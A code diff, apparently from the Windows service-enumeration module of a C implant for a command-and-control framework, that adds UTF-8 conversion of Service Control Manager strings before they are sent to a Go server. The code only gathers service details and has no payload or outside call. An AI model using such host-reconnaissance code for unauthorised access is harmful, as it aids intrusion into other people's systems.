@@ -2,12 +2,29 @@
 #include "sliver/services.h"
 
 #include "sliver/log.h"
+#include "sliver/proc.h" /* sliver_utf8_from_acp */
 
 #include <windows.h>
 
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+
+/* Every string goes to a protobuf `string` field, which must be valid UTF-8 or
+ * the Go server rejects the whole message. The SCM A-APIs return ANSI (GBK on a
+ * Chinese Windows), so convert before storing. */
+static void store_utf8(char *dst, size_t cap, const char *src) {
+  if (dst == NULL || cap == 0) {
+    return;
+  }
+  if (src == NULL) {
+    dst[0] = '\0';
+    return;
+  }
+  if (sliver_utf8_from_acp(src, dst, cap) != 0) {
+    (void)snprintf(dst, cap, "%s", src);
+  }
+}
 
 static void fill_details(SC_HANDLE scm, const char *name, sliver_service_t *out) {
   SC_HANDLE svc;
@@ -24,9 +41,9 @@ static void fill_details(SC_HANDLE scm, const char *name, sliver_service_t *out)
   if (needed != 0) {
     cfg = (QUERY_SERVICE_CONFIGA *)malloc(needed);
     if (cfg != NULL && QueryServiceConfigA(svc, cfg, needed, &needed)) {
-      (void)snprintf(out->display_name, sizeof(out->display_name), "%s", cfg->lpDisplayName != NULL ? cfg->lpDisplayName : "");
-      (void)snprintf(out->bin_path, sizeof(out->bin_path), "%s", cfg->lpBinaryPathName != NULL ? cfg->lpBinaryPathName : "");
-      (void)snprintf(out->account, sizeof(out->account), "%s", cfg->lpServiceStartName != NULL ? cfg->lpServiceStartName : "");
+      store_utf8(out->display_name, sizeof(out->display_name), cfg->lpDisplayName);
+      store_utf8(out->bin_path, sizeof(out->bin_path), cfg->lpBinaryPathName);
+      store_utf8(out->account, sizeof(out->account), cfg->lpServiceStartName);
       out->startup_type = cfg->dwStartType;
     }
     free(cfg);
@@ -37,7 +54,7 @@ static void fill_details(SC_HANDLE scm, const char *name, sliver_service_t *out)
     desc = (SERVICE_DESCRIPTIONA *)malloc(needed);
     if (desc != NULL && QueryServiceConfig2A(svc, SERVICE_CONFIG_DESCRIPTION, (LPBYTE)desc, needed, &needed)) {
       if (desc->lpDescription != NULL) {
-        (void)snprintf(out->description, sizeof(out->description), "%s", desc->lpDescription);
+        store_utf8(out->description, sizeof(out->description), desc->lpDescription);
       }
     }
     free(desc);
@@ -97,7 +114,7 @@ int sliver_services_list(sliver_service_t *out, int max) {
     fill_details(scm, items[i].lpServiceName, it);
     it->status = items[i].ServiceStatusProcess.dwCurrentState;
     if (it->display_name[0] == 0) {
-      (void)snprintf(it->display_name, sizeof(it->display_name), "%s", items[i].lpDisplayName);
+      store_utf8(it->display_name, sizeof(it->display_name), items[i].lpDisplayName);
     }
     count++;
   }
